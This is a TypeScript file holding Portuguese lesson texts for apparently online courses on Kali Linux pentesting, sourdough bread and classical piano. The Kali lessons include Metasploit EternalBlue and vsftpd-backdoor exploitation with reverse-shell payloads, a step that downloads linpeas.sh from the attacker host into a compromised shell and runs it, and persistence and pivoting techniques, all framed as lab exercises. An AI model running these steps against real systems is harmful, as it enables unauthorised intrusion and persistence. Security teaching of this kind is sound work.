// Lesson content (markdown) por courseSlug/moduleSlug/lessonSlug.
// Formato esperado pelo parser em components/LessonClient.tsx:
// - primeiro parágrafo (sem heading) vira dropcap/intro
// - "## Título" ou "# Título" inicia seção
// - ```...``` vira code block (colado à seção atual)

export const LESSON_CONTENT: Record<string, string> = {
  // ─── Kali Linux ──────────────────────────────────────────────────────────

  "kali-linux-essencial/foundations/what-kali-actually-is": `Kali Linux não é um sistema operacional para o dia a dia — é uma toolbox empacotada sobre Debian. Pensar nele como "Ubuntu para hackers" é o engano mais comum. Entender a diferença define como você usa.

## O que Kali é

Uma distribuição Debian-based curada pela Offensive Security, com cerca de 600 ferramentas pré-instaladas divididas por fase de engajamento: reconhecimento, enumeração, análise de vulnerabilidades, exploração, pós-exploração e reporting. O kernel tem patches específicos para suportar drivers de placas Wi-Fi em modo monitor, injeção de pacotes e dispositivos USB que a maioria das distros ignora.

## O que Kali não é

Não é seu laptop de estudo. As credenciais padrão são fracas, serviços de rede vêm desabilitados por design, e o usuário opera como root ou com sudo NOPASSWD em muitos fluxos. Esse padrão existe porque ferramentas de pentest precisam de privilégios baixo nível — e porque a suposição é que a máquina é descartável ou isolada.

## Quando usar

Use Kali em VMs dedicadas, live USBs, containers ou em uma partição separada que você formata sem dor. Para estudo sério de segurança ofensiva, mantenha um laboratório: máquina-alvo (Metasploitable, DVWA, VulnHub) isolada em rede virtual, e o Kali como atacante. Nunca rode Kali direto na máquina pessoal.`,

  "kali-linux-essencial/foundations/install-and-first-boot": `A instalação é quase trivial — o que importa é configurar o ambiente antes de tocar em qualquer alvo. O primeiro boot define se você terá um laboratório controlado ou uma máquina que quebra na semana seguinte.

## Preparar a VM

Use VirtualBox ou VMware. Aloque 4 GB de RAM (mínimo), 40 GB de disco, 2 vCPUs. Rede em modo "Host-only" ou "Internal network" — nunca "Bridged" enquanto você estiver aprendendo. O ISO do Kali vem em dois sabores: installer tradicional (disco persistente) e live (sem instalação, sem persistência).

\`\`\`bash
# Baixar e verificar assinatura do ISO
wget https://cdimage.kali.org/kali-2024.1/kali-linux-2024.1-installer-amd64.iso
wget https://cdimage.kali.org/kali-2024.1/SHA256SUMS
sha256sum -c SHA256SUMS --ignore-missing
\`\`\`

## Primeiro boot

Após instalar, rode \`sudo apt update && sudo apt full-upgrade -y\`. Instale VirtualBox Guest Additions se for VM. Configure um snapshot limpo antes de qualquer experimento — você vai voltar para ele com frequência.

## Usuário não-root

Desde 2020 o Kali cria um usuário normal. Use \`sudo\` quando precisar. Se estiver aprendendo, resista à tentação de virar root permanente — isso é bom hábito que se carrega para qualquer ambiente.`,

  "kali-linux-essencial/foundations/filesystem-layout": `O Filesystem Hierarchy Standard (FHS) é a mesma base do Debian, mas com convenções específicas para ferramentas de segurança. Saber onde as coisas vivem economiza horas de \`find\` desesperado.

## Diretórios principais

\`/usr/share/\` guarda wordlists, assinaturas e dados estáticos das ferramentas. \`rockyou.txt\` mora em \`/usr/share/wordlists/\` (precisa ser descompactado). \`/opt\` é onde você coloca ferramentas de terceiros instaladas manualmente, e \`/root\` (ou seu home) é para projetos e resultados.

## Configs relevantes

Arquivos de configuração ficam em \`/etc\`. Para ferramentas como Burp, OWASP ZAP e Metasploit, as configs de usuário ficam em \`~/.config\` ou \`~/.msf4\`. Logs de sistema em \`/var/log\`.

## Organização de pentest

Uma convenção útil: criar \`~/engagements/<cliente>/<data>\` com subdiretórios \`recon/\`, \`exploitation/\`, \`loot/\`, \`report/\`. Essa estrutura vira o backbone do relatório final.

\`\`\`bash
mkdir -p ~/engagements/acme/$(date +%Y-%m-%d)/{recon,exploitation,loot,report}
\`\`\``,

  "kali-linux-essencial/foundations/update-streams": `Kali usa três canais de atualização — rolling, last-snapshot e a trilha experimental. Escolher o errado significa ou travar na versão antiga ou correr atrás de bugs não resolvidos. Este quiz testa se você consegue identificar qual canal usar em cada cenário.

## Rolling vs. Snapshot

O repositório padrão é \`kali-rolling\`, que recebe updates contínuos. Para ambientes de produção ou laboratórios estáveis, \`kali-last-snapshot\` congela em pontos conhecidos e testados.

## Política de updates

Em máquina pessoal de estudo, rode \`apt update && apt upgrade\` semanalmente. Em laboratório sensível, snapshot + upgrade controlado. Antes de qualquer upgrade grande, faça snapshot da VM.`,

  "kali-linux-essencial/network-recon/nmap-basics": `Nmap é a ferramenta de reconhecimento mais antiga ainda em uso ativo — e o motivo é simples: ela faz uma coisa muito bem e é configurável até o nível do pacote TCP. Antes de lançar um scan, você precisa entender o que está pedindo para a rede fazer.

## Os três scans que importam

\`-sS\` (SYN stealth): envia SYN, espera SYN/ACK, nunca completa o handshake. Mais rápido e menos logável. Precisa de root. \`-sT\` (TCP connect): handshake completo, fácil de detectar mas não precisa privilégios. \`-sU\` (UDP): lento e ruidoso, mas DNS, SNMP e NTP só aparecem aqui.

\`\`\`bash
# SYN scan das 1000 portas mais comuns
sudo nmap -sS 192.168.56.10

# Full TCP port scan, OS detection, version detection, scripts
sudo nmap -sS -sV -O -A -p- 192.168.56.10
\`\`\`

## Timing e discrição

\`-T4\` é o padrão agressivo razoável. \`-T2\` é mais lento e menos detectável por IDS. Em redes de produção, comece sempre com timing baixo.

## Output

\`-oA <base>\` gera três arquivos: normal, XML (para parsing) e grepable. Sempre salve output — você vai precisar consultar depois.`,

  "kali-linux-essencial/network-recon/network-recon-nmap": `Este lab consolida os conceitos de nmap contra um alvo vulnerável controlado. O objetivo não é "pegar todos os serviços" — é montar uma imagem mental da topologia antes de decidir o próximo passo.

## Setup

Você precisa de duas VMs: Kali (atacante) e Metasploitable2 ou DVWA (alvo). Ambas em rede interna \`vboxnet0\` ou similar. Confirme que o Kali alcança o alvo com \`ping\` antes de scanear.

## Passos

1. Host discovery: \`nmap -sn 192.168.56.0/24\`
2. Port scan inicial rápido: \`nmap -F 192.168.56.10\`
3. Scan completo: \`nmap -sS -sV -p- -oA full 192.168.56.10\`
4. Scripts NSE relevantes: \`nmap --script=vuln 192.168.56.10\`

\`\`\`bash
# Fluxo completo em um comando
sudo nmap -sS -sV -sC -O -p- \\
  --min-rate 1000 \\
  -oA engagements/lab-01/recon/full-scan \\
  192.168.56.10
\`\`\`

## Leitura dos resultados

Anote: portas abertas, versões dos serviços, possíveis OS fingerprints, e qualquer script NSE que reportou vulnerabilidade. Essas anotações viram o input da próxima fase.`,

  "kali-linux-essencial/network-recon/service-enumeration": `Ter a porta aberta é só metade da história. Enumerar o serviço é descobrir versão, configuração, e o que o servidor expõe sem que você tenha que pedir licença. Cada protocolo tem seu próprio vocabulário.

## HTTP/HTTPS

\`gobuster\`, \`feroxbuster\` e \`ffuf\` varrem diretórios e endpoints. \`nikto\` faz checagens genéricas de configuração. \`whatweb\` e \`wappalyzer\` identificam tecnologia. Sempre comece pelo \`/robots.txt\`, \`/sitemap.xml\` e headers.

## SMB

\`smbclient -L //host -N\` lista shares. \`enum4linux-ng\` enumera usuários, políticas, shares. Versões antigas (SMBv1) muitas vezes permitem anonymous bind.

## SSH / FTP / SMTP

Banners contam quase tudo. \`nc\` ou \`telnet\` na porta, leitura silenciosa do banner. \`hydra\` e \`medusa\` para brute-force autorizado. \`SMTP VRFY\` e \`RCPT TO\` enumeram usuários em servidores velhos.`,

  "kali-linux-essencial/network-recon/tracing-routes": `Traceroute e mtr revelam topologia, firewalls silenciosos e latências suspeitas. Em um engagement, saber onde os pacotes param é tão importante quanto saber onde chegam.

## Ferramentas

\`\`\`bash
# Tradicional
traceroute -n 10.0.0.50

# Via TCP (passa firewalls que bloqueiam ICMP)
traceroute -T -p 443 10.0.0.50

# MTR: traceroute contínuo com estatísticas
mtr -n --report --report-cycles 20 10.0.0.50
\`\`\`

## Interpretação

Asteriscos consecutivos indicam firewall dropando. Mudança brusca de latência aponta para saída da rede local. Se \`-T -p 443\` passa mas ICMP não, você tem um firewall stateful.

## Validação

Combine traceroute com nmap \`--traceroute\`. Os resultados devem concordar — se não concordam, há roteamento assimétrico ou um proxy no meio.`,

  "kali-linux-essencial/vuln-assessment/nessus-openvas": `Scanners de vulnerabilidade fazem duas coisas: varrem muitas checagens rapidamente, e geram relatórios padronizados. Eles não "encontram vulnerabilidades" — eles encontram assinaturas, e a diferença é a fonte de 90% dos falsos positivos.

## Nessus

Comercial, 16 dólares/mês para Essentials (até 16 IPs). Base de plugins atualizada diariamente. Interface web na porta 8834. Use quando precisar de compliance reports (PCI, HIPAA) out of the box.

## OpenVAS / Greenbone

Open source, incluído no Kali via \`gvm-setup\`. Plugins via feed diário da Greenbone Community. Mais barulhento que o Nessus, mais falsos positivos, mas grátis.

\`\`\`bash
# Setup inicial do Greenbone
sudo gvm-setup
sudo gvm-start
# UI em https://127.0.0.1:9392
\`\`\`

## Quando não usar

Scanners não substituem análise manual. Em alvos críticos, eles são o primeiro passo, não o único. Em alvos com IDS, o ruído pode fechar a janela antes de você explorar nada útil.`,

  "kali-linux-essencial/vuln-assessment/web-scanning": `Aplicações web são o vetor mais comum, e também o mais complicado. Um scanner automatizado te dá a casca, mas as vulnerabilidades que importam em 2026 (IDOR, SSRF, lógica de negócio) exigem olhar humano.

## Ferramentas úteis

\`\`\`bash
# Directory/file discovery
feroxbuster -u https://alvo.com -w /usr/share/seclists/Discovery/Web-Content/common.txt

# Active scanner
nikto -h https://alvo.com -output nikto.txt

# Full-feature com proxy
# Burp Suite Community em foreground, configurando navegador para 127.0.0.1:8080
\`\`\`

## O que o scanner não pega

Autenticação quebrada, IDOR, race conditions, confusão de tipo em JSON, SSRF que exige payload específico para a cloud do alvo. Essas são descobertas manuais — via Burp Repeater, Intruder e curiosidade.

## Ordem de exploração

1. Mapear superfície (spider, diretórios)
2. Testar auth (login, session, JWT)
3. Testar input (XSS, SQLi, SSTI)
4. Testar lógica (IDOR, preços, privilégios)`,

  "kali-linux-essencial/vuln-assessment/false-positives": `Falsos positivos não são bug — são consequência inevitável de scanners baseados em assinatura. Aprender a triá-los rapidamente é o que separa analista júnior de sênior. Este quiz testa seu filtro.

## Tipos comuns

Assinaturas desatualizadas ("vulnerável a CVE-X" num patched server), checagens de versão que comparam strings ("2.4.29" vs "2.4.29p1"), e redirect chains que confundem o scanner.

## Como validar

Sempre reproduza manualmente. Se o scanner diz "SQL injection no parâmetro \`id\`", abra Burp, mande manualmente \`id=1'\`, \`id=1 OR 1=1\`, veja o comportamento. Tempo > 1 minuto por finding.`,

  "kali-linux-essencial/exploitation/metasploit-intro": `Metasploit não é "o botão que hackeia". É um framework que organiza exploits conhecidos, payloads e handlers em módulos reutilizáveis. Quem entende o ciclo de msfconsole economiza semanas de scripting.

## Componentes

Exploits, payloads, encoders, post modules, auxiliaries. Você seleciona um exploit, define o alvo com \`RHOSTS\`, escolhe um payload (\`meterpreter\`, \`shell_reverse_tcp\`), define \`LHOST\` e \`LPORT\`, e roda.

\`\`\`bash
msfconsole -q
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.10
set LHOST 192.168.56.1
set payload windows/x64/meterpreter/reverse_tcp
check
run
\`\`\`

## Database

\`msfdb init\` cria o PostgreSQL do Metasploit. \`db_nmap -sV host\` roda nmap e importa os resultados direto. \`services\`, \`hosts\`, \`vulns\` buscam no DB.

## Boas práticas

Sempre rode \`check\` antes de \`run\`. Use \`--dry-run\` quando disponível. Salve sessions (\`sessions -i N\` para interagir, \`bg\` para background).`,

  "kali-linux-essencial/exploitation/payloads-vs-exploits": `Exploit é a técnica que aproveita a falha. Payload é o que roda depois que a exploração teve sucesso. Confundir os dois é o erro mais comum de iniciante — e leva a decisões ruins em sessões críticas.

## Exploit

A "arma". Um buffer overflow, um comando injetado, uma deserialização insegura. Entrega o controle de execução ao atacante por alguns milissegundos.

## Payload

O "que fazer com o controle". Abrir um shell? Reverter para o C2? Baixar e executar um binário? Injetar em processo? Payloads podem ser stageless (tudo de uma vez) ou staged (carregador pequeno que baixa o resto).`,

  "kali-linux-essencial/exploitation/initial-access": `Initial access é o primeiro pé na porta — antes dela, você só tem teoria. Depois dela, você tem um shell em alguma forma, de alguém, em algum lugar. Este lab usa Metasploitable2 como alvo controlado.

## Pré-requisitos

VM Metasploitable2 rodando, Kali em mesma rede interna, \`msfdb\` ativo.

\`\`\`bash
# Reconhecimento
db_nmap -sV 192.168.56.101

# vsftpd 2.3.4 tem backdoor conhecido
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
run
\`\`\`

## Verificação

Após \`run\`, você deve ter um shell. \`id\`, \`hostname\`, \`uname -a\` são comandos de baseline para confirmar onde você está. Salve tudo com \`set VERBOSE true\` e logging habilitado.

## Alternativas

Se vsftpd falhar, tente \`distcc_exec\` ou \`samba_usermap_script\`. Metasploitable2 tem várias portas vulneráveis propositalmente.`,

  "kali-linux-essencial/exploitation/privilege-escalation": `Ter um shell de baixo privilégio é apenas o começo. Priv esc é o caminho de \`www-data\` até \`root\` — e raramente é um único exploit, é uma cadeia de decisões informadas.

## Enumeração

Primeira regra: automatize o óbvio. \`linpeas.sh\` e \`linux-smart-enumeration\` varrem configs fracas, SUID binaries, cron jobs editáveis, e kernel versions com exploits conhecidos.

\`\`\`bash
# Dentro do shell comprometido
wget http://192.168.56.1/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas-output.txt
\`\`\`

## Vetores clássicos

SUID binaries (\`find / -perm -u=s -type f 2>/dev/null\`), sudo misconfigurations (\`sudo -l\`), cron jobs com paths relativos, kernel exploits (\`uname -a\` + exploitdb), credentials em arquivos mundo-readable.

## Documentação

Sempre registre o caminho completo: comando que rodou, output, PID do processo elevado. Isso vira parte do relatório.`,

  "kali-linux-essencial/post-exploitation/persistence": `Persistência é o que mantém o acesso após reboot, logout ou patch. Em red team autorizado, é parte do objetivo. Em blue team, saber disso é como você detecta.

## Técnicas em Linux

Cron jobs na raiz, systemd units, SSH authorized_keys, LD_PRELOAD em .bashrc, backdoor em pacote instalado. Cada uma tem trade-off entre stealth e estabilidade.

## Técnicas em Windows

Registry Run keys, scheduled tasks, services, WMI event subscriptions, DLL sideloading. Mimikatz e Impacket cobrem a maior parte.

## Detecção

Ferramentas de IR procuram por exatamente esses vetores. Um cron job root que não estava no baseline, um systemd unit sem documentação, uma chave SSH recente — tudo vira red flag. Por isso persistência bem feita é quieta, não invisível.`,

  "kali-linux-essencial/post-exploitation/pivoting": `Pivoting é usar o host comprometido como ponte para alcançar segmentos de rede que não são acessíveis da sua máquina original. É a técnica que transforma "um servidor comprometido" em "rede comprometida".

## SSH dynamic port forwarding

\`\`\`bash
# No Kali: cria proxy SOCKS5 via host comprometido
ssh -D 1080 -N usuario@host-comprometido

# Configura proxychains para usar 127.0.0.1:1080
proxychains nmap -sT -Pn 10.0.0.0/24
\`\`\`

## Metasploit pivoting

Com sessão meterpreter ativa, \`run autoroute -s 10.0.0.0/24\` adiciona rota pela sessão. \`portfwd add -l 8080 -r target -p 80\` cria port forward local.

## Limitações

Latência multiplica. Ferramentas que usam raw sockets (nmap SYN scan) não funcionam sobre SOCKS — só TCP connect. Planeje antes de rodar scans caros.`,

  "kali-linux-essencial/post-exploitation/reporting": `O relatório é o entregável. Todo trabalho anterior existe para alimentar este documento — sem ele, o pentest é um show particular sem valor para o cliente. Este projeto consolida o engagement completo.

## Estrutura padrão

1. Sumário executivo (1 página, sem jargão)
2. Escopo e metodologia
3. Achados (cada um: CVSS, impacto, PoC, remediação)
4. Evidências (screenshots, output, hashes)
5. Recomendações estratégicas

## Critérios de qualidade

Cada finding precisa ser reproduzível: steps claros, requisitos de ambiente, indicador de sucesso. Severidade baseada em CVSS 3.1 + contexto do cliente. Remediação com referência (CWE, vendor doc).

## Entregável

Versão PDF para cliente, versão Markdown no repo do engagement, versão JSON estruturada para integração com ticketing. Três formatos, um só conteúdo.`,

  // ─── Pão artesanal ───────────────────────────────────────────────────────

  "pao-artesanal/fundamentos/farinha-agua-sal": `Três ingredientes, uma variável. O que transforma farinha, água e sal em pão é o tempo somado ao glúten — e essa equação se move dependendo de qual farinha você usa, qual água, quanto sal. Entender cada um isoladamente vem antes de qualquer receita.

## Farinha

Proteína (glúten) na farinha define estrutura. Trigo comum no Brasil tem 9–11% de proteína. Para fermentação natural, o ideal é 11–13% (T55, T65 ou marcas artesanais). Farinha integral adiciona sabor e fibra, mas absorve mais água.

## Água

Hidratação é a proporção entre água e farinha (em peso). Uma massa de 70% hidratação tem 700g de água para 1000g de farinha. Abaixo de 65%, massa dura. Acima de 80%, massa muito pegajosa — pede técnica de dobras bem aplicada.

## Sal

Sal não é só tempero: ele regula a atividade das leveduras e fortalece o glúten. Sem sal, a massa fermenta rápido demais e desanda. A proporção padrão é 2% do peso da farinha.`,

  "pao-artesanal/fundamentos/hidratacao": `Hidratação é um orçamento. Mais água significa mais abertura do miolo, mais complexidade de sabor — e mais dificuldade. A escolha depende menos de ambição e mais de qual tipo de pão você quer comer.

## Hidratações de referência

60–65%: pães de forma, brioches, massas firmes. 68–72%: pães rústicos padrão, baguete. 75–80%: ciabatta, focaccia, high-hydration country bread. Acima de 85%: técnica avançada, resultados espetaculares quando dá certo.

## Quando subir

Dobre a hidratação apenas quando dominar o nível anterior. Se sua massa em 68% já abre bem no corte, experimente 72%. Subir direto para 80% com técnica fraca resulta em pão achatado.`,

  "pao-artesanal/fundamentos/temperatura-ambiente": `Fermento natural é sensível à temperatura mais que qualquer outra variável. Quando a receita diz "fermentar até dobrar", isso acontece em 4 horas a 28°C e em 10 horas a 18°C. Saber ler a massa é mais útil que seguir o relógio.

## Janelas úteis

22–26°C: janela confortável para fermentação em bloco. 28–30°C: aceleração, útil no inverno com forno desligado apenas com luz acesa. Abaixo de 20°C: massa fica lenta, sabor mais ácido.

## Tempo + Temperatura

A regra: baixa temperatura + tempo longo = sabor complexo, acidez balanceada. Alta temperatura + tempo curto = mais doce, menos ácido. Retarde overnight (geladeira 4°C por 12–16h) é o truque mais importante para sabor.`,

  "pao-artesanal/levain/criar-levain": `Criar um levain é domesticar um ecossistema microbiano. Não é difícil — é só paciente. Em 7 dias você passa de farinha e água para uma colônia estável de leveduras e bactérias lácticas.

## Receita base

\`\`\`
Dia 1: 50g farinha integral + 50g água (25°C)
Dia 2: descartar metade + 50g farinha + 50g água
Dia 3–7: 2x por dia, mesma proporção
\`\`\`

## Sinais de vida

Dia 2–3: primeira atividade (bolhas pequenas), cheiro ácido. Dia 4–5: dobra de volume em 6–8h. Dia 7: dobra em 4h, cheiro frutado. Se dobra em 4h, está pronto para padaria.

## Manutenção

Após pronto, guarde na geladeira e refresque 1x por semana com 1:1:1. Para usar, tire 12h antes e refresque à temperatura ambiente.`,

  "pao-artesanal/levain/leitura-do-levain": `Levain ativo tem janela de uso. Muito cedo, não fermenta o pão. Muito tarde, está azedando e perde força. Saber ler a curva é a diferença entre pão aberto e tijolo.

## Os três estados

Em crescimento: bolhas pequenas, superfície lisa, 30% acima do início. Meio inadequado. Pico: dobrou ou triplicou, superfície borbulhada, cheiro doce-frutado. Momento ideal. Decaindo: começou a baixar, cheiro ácido pronunciado. Ainda funciona, resultado mais ácido.

## Teste do copo d'água

Coloque uma colher pequena de levain em água. Se boia, está pronto. Se afunda, precisa de mais tempo. Método visual rápido e confiável.`,

  "pao-artesanal/levain/refrescos": `Refresco não é só "alimentar". É o processo de rejuvenescer a colônia e ajustar para a próxima tarefa. Este quiz cobre as proporções e timings que funcionam consistentemente.

## Proporções

1:1:1 é o padrão (manutenção). 1:5:5 é para pão (menor carga de ácido, mais vigor). 1:10:10 é para panetones e massas doces que fermentam lentamente.

## Timing

Levain precisa atingir pico antes de virar massa. A maioria das receitas pede "levain em pico" às 8h para mistura às 10h. Refresque na noite anterior ou na madrugada conforme sua temperatura ambiente.`,

  "pao-artesanal/massa/autolise": `Autólise é 30 minutos de inatividade que economizam horas de sova. A farinha e a água descansam sozinhas antes do sal e do levain entrarem — e o glúten se organiza sem esforço mecânico.

## Como fazer

Misture apenas farinha e água (receita menos o sal, levain e 10% da água reservada). Cubra, deixe 30 minutos a 2 horas. Depois adicione sal dissolvido na água reservada e o levain. Incorpore com a mão (pinch and fold).

## Por que funciona

Enzimas da farinha começam a quebrar amidos em açúcares. Proteínas do glúten se hidratam e começam a se alinhar. Você chega ao final com massa mais estendível, mais elástica, mais fácil de trabalhar.`,

  "pao-artesanal/massa/dobras": `Dobras substituem sova. Em massas de alta hidratação, sovar é impossível sem ferramenta — as dobras desenvolvem glúten intermitentemente, preservando as bolhas de ar que a fermentação já criou.

## Técnica

\`\`\`
A cada 30 min, durante 2h:
1. Molhe a mão
2. Puxe um lado da massa para cima e dobre sobre o centro
3. Repita nos quatro lados (N, S, L, O)
4. Vire a massa (costura para baixo)
5. Cubra
\`\`\`

## O que observar

Primeira dobra: massa ainda quebradiça. Segunda: começa a segurar tensão. Terceira: estende sem rasgar. Quarta: superfície lisa, massa "viva" ao toque.`,

  "pao-artesanal/massa/fermentacao-em-bloco": `Bulk fermentation é o estágio onde 80% do sabor é construído. Entre o final das dobras e a pré-modelagem, a massa precisa ter fermentado o suficiente para subir no forno — sem passar.

## Sinais de ponto

Aumento de volume: 30% a 70%, dependendo da receita. Bolhas visíveis na superfície e lateral do recipiente. Massa jiggly (treme como pudim). Teste do dedo: pressione 1cm, deve voltar lentamente. Se voltar rápido, falta fermentação. Se não voltar, passou.

## Temperatura importa

A 24°C, bulk ideal é 4–5h. A 28°C, 3h. Abaixo de 22°C, até 8h. Retarde overnight na geladeira desacelera mas não para — planeje a janela.`,

  "pao-artesanal/forno/modelagem": `Modelagem define a tensão externa da massa. Boa modelagem cria uma "pele" que segura o crescimento no forno, produzindo o oven spring característico. Sem tensão, a massa espalha em vez de subir.

## Boule (bola)

Vire a massa em superfície levemente enfarinhada. Use as duas mãos em concha, puxe a massa em sua direção enquanto gira. A fricção com a bancada cria tensão. 4–6 movimentos rotativos bastam.

## Bâtard (oval)

Achate levemente. Dobre um terço superior para o centro. Dobre o inferior sobre esse. Role em direção a você formando um cilindro. Aperte a costura para selar.

## Descanso

Após modelar, deixe em banneton (com farinha de arroz) ou tigela forrada com pano. Pode ir direto para retarde overnight na geladeira (8–14h) ou fermentar em temperatura ambiente por 1–2h.`,

  "pao-artesanal/forno/cortes-e-assamento": `O corte (scoring) não é decorativo — é funcional. Ele controla onde a massa vai abrir no forno, evitando rasgos laterais. O vapor nos primeiros 10 minutos determina o brilho e a abertura da casca.

## Cortes básicos

\`\`\`
Boule: cruz, círculo ou listras paralelas
Bâtard: uma grande lâmina em ângulo de 30°
\`\`\`

Use lâmina de barbear ou bisturi, profundidade de 0.5–1cm, ângulo raso (não vertical) para criar a "orelha".

## Assamento com vapor

Preaqueça forno + panela de ferro ou pedra por 45 min a 250°C. Primeiros 20 min: tampado ou com bandeja de água fervente no forno. Depois: destampa, baixa para 220°C, asse mais 20–25 min até casca castanha escura.`,

  "pao-artesanal/forno/cascas-miolo": `O pão final conta a história da fermentação. Casca, miolo e aroma são a avaliação — e cada defeito aponta para um ponto específico do processo que você pode ajustar na próxima fornada.

## Critérios de sucesso

Casca: castanha escura, crocante, "sings" (estala ao esfriar). Miolo: alvéolos irregulares mas abertos, translúcidos, elásticos. Aroma: doce-amanteigado no imediato, ácido sutil nas 24h seguintes.

## Defeitos e causas

Miolo denso: fermentação curta ou levain fraco. Casca clara e mole: forno frio ou pouco vapor. Rasgos laterais: corte insuficiente ou modelagem fraca. Gum line (faixa gomosa): miolo subfermentado ou cortado quente demais.

## Entregável

Fornada de 2 pães (1 boule, 1 bâtard) com fotos de casca, miolo e documentação dos parâmetros: hidratação, tempo de bulk, temperatura ambiente, tempo de retarde. Serve para calibrar próximas fornadas.`,

  // ─── Piano clássico ──────────────────────────────────────────────────────

  "piano-classico/postura/postura-das-maos": `A postura das mãos ao piano não é estética — é mecânica. Qualquer tensão desnecessária se acumula e aparece como lesão em meses. Dominar a posição neutra é o primeiro passo que você nunca para de refinar.

## Forma básica

Imagine segurar uma laranja: dedos curvados, articulações firmes mas não rígidas, pulso nivelado com o antebraço. Os dedos tocam a tecla com a ponta (não com o polpa plana), e a força vem do peso do braço, não do dedo isolado.

## Ombros, cotovelos, pulsos

Ombros relaxados, longe das orelhas. Cotovelos levemente afastados do tronco. Pulsos flexíveis — se o pulso trava, qualquer passagem rápida vira sofrimento. Posição do banco: altura onde antebraço fica paralelo ao chão.

## Teste

Toque uma escala lentamente olhando para a sua mão. Algum dedo levanta exageradamente? O polegar trava? O pulso oscila? Cada um desses sinais é informação sobre o que ajustar antes de acelerar.`,

  "piano-classico/postura/leitura-do-pentagrama": `Ler partitura é decifrar duas dimensões simultâneas: altura (qual nota) e duração (por quanto tempo). O pentagrama é um sistema de coordenadas visual projetado para ser absorvido — não decorado.

## As cinco linhas

Clave de sol (mão direita): linhas são Mi-Sol-Si-Ré-Fá, espaços são Fá-Lá-Dó-Mi. Mnemônicos ajudam no início mas viram muleta se você depende deles aos seis meses.

## Duração

Semibreve (4 tempos) → mínima (2) → semínima (1) → colcheia (1/2) → semicolcheia (1/4). Cada divisão é metade da anterior. Pontos aumentam em 50% a duração.

## Abordagem

Leia por padrões, não nota a nota. Graus conjuntos (subidas/descidas), saltos de terça (linha pula linha), saltos de quinta, oitava. Com uma hora diária, em 2 meses você lê fluentemente em tempo real peças de nível 1.`,

  "piano-classico/postura/claves-fa-sol": `As claves são convenções para localizar notas graves e agudas sem precisar de linhas suplementares excessivas. Trocar entre elas é um teste de orientação espacial. Este quiz verifica sua fluência.

## Clave de sol

Indica Sol na segunda linha. Usada pela mão direita e por instrumentos agudos. Todas as notas acima do Dó central normalmente aparecem aqui.

## Clave de fá

Indica Fá na quarta linha. Usada pela mão esquerda e instrumentos graves. Dó central é uma linha suplementar acima do pentagrama em fá (e uma linha suplementar abaixo em clave de sol — as duas se conectam ali).`,

  "piano-classico/postura/dedilhado-inicial": `Dedilhado correto não é opcional. O dedilhado sugerido pelo editor existe porque minimiza movimentos de mão e prepara para a próxima passagem. Ignorá-lo resulta em tropeços garantidos.

## Numeração

1 é polegar, 2 indicador, 3 médio, 4 anelar, 5 mínimo. Mesmo nas duas mãos (a numeração é relativa à mão, não ao lado do piano).

## Exercício básico

\`\`\`
Mão direita: Dó Ré Mi Fá Sol com dedos 1-2-3-4-5
Suba e desça lentamente (60 bpm, semínimas)
Repita com mão esquerda: Dó Si Lá Sol Fá com 1-2-3-4-5
Ambas juntas: mesmo movimento
\`\`\`

## O que observar

Cada dedo deve tocar com a mesma força. Dedos fracos (4 e 5) precisam de atenção extra. Use peso do braço, não tensão muscular.`,

  "piano-classico/postura/ritmo-basico": `Ritmo é a espinha dorsal da música. Altura sem ritmo é ruído organizado. Ritmo sem altura ainda é música (pense em percussão). Aprender a sentir o tempo é anterior a tocar qualquer peça.

## Compasso

O numerador (de cima) indica quantos tempos por compasso. O denominador (embaixo) indica qual figura vale 1 tempo. 4/4 é o mais comum (quatro tempos de semínima), 3/4 é valsa, 6/8 é compasso composto.

## Metrônomo

Não é opcional para estudo. Comece lento (60 bpm), suba 5 bpm por sessão. Se não consegue tocar a passagem 3 vezes seguidas sem erro, volte 10 bpm. Método comprovado, odiado, necessário.`,

  "piano-classico/postura/primeiro-exercicio": `Este lab combina postura, leitura, dedilhado e ritmo no primeiro estudo completo. O objetivo não é velocidade — é executar limpo, com os quatro elementos integrados simultaneamente.

## Exercício

Escolha um estudo fácil: Czerny Op. 599 nº 1 ou Bartók Mikrokosmos Vol. 1 nº 1. Peça de 8–16 compassos, ambas as mãos, em 4/4.

## Processo

1. Leia a partitura sem tocar (cante as alturas, bata o ritmo).
2. Toque mão direita sozinha, lentamente.
3. Toque mão esquerda sozinha, lentamente.
4. Toque juntas em 50% da velocidade alvo.
5. Aumente 10% quando conseguir 3 passadas limpas.

## Sinais de progresso

Fluência vem quando você para de pensar em cada nota. Quando os dedos anteciparem o que os olhos leem, você está pronto para a próxima peça.`,

  "piano-classico/tecnicas/escalas-maiores": `Escalas não são ornamentos — são o alfabeto da mão. Sem fluência em escalas, peças do repertório ficam cheias de pequenas hesitações. Hanon e Czerny são impostos por um motivo.

## Dedilhado padrão

\`\`\`
Dó maior MD: 1-2-3-1-2-3-4-5 subindo
           5-4-3-2-1-3-2-1 descendo
ME (espelhada): 5-4-3-2-1-3-2-1 subindo
\`\`\`

A passagem do polegar (chamada de "thumb under") acontece nos pontos 3-1 e 4-1. Treine a passagem isoladamente antes da escala inteira.

## Regime

Uma escala por dia, 10 minutos. Duas mãos, duas oitavas, quatro oitavas quando dominar. Metrônomo obrigatório.`,

  "piano-classico/tecnicas/escalas-menores": `Escalas menores adicionam três variantes — natural, harmônica e melódica. Entender quando cada uma aparece em peças do repertório é pré-requisito para tocar Bach, Chopin, Rachmaninoff sem surpresas.

## As três formas

Menor natural: usa armadura da relativa maior (Lá menor = mesma armadura de Dó maior). Menor harmônica: sétimo grau aumentado (Sol# em Lá menor). Menor melódica: sexto e sétimo graus aumentados subindo, naturais descendo.

## Qual aparece quando

Repertório barroco: harmônica domina. Clássico-Romântico: melódica e harmônica alternam. Folk e jazz modal: natural. Tocar a versão errada trai falta de atenção ao contexto.`,

  "piano-classico/tecnicas/arpejos": `Arpejo é acorde tocado nota a nota. É base de acompanhamento em incontáveis peças — Fur Elise, Prelude em Dó do Bach, Gymnopédie do Satie, Moonlight Sonata. Domine e metade do repertório inicial abre.

## Estrutura

Tríades maiores: 1ª, 3ª maior, 5ª justa. Mãos separadas primeiro, usando dedos 1-3-5 (ou 1-2-5 para intervalos mais largos).

## Exercício base

\`\`\`
Dó maior arpejo:
MD: Dó-Mi-Sol-Dó (1-3-5-1 oitava acima)
ME: Dó-Sol-Mi-Dó (5-3-2-1 descendo)
Repita em todas as 12 tonalidades
\`\`\`

## Cuidado

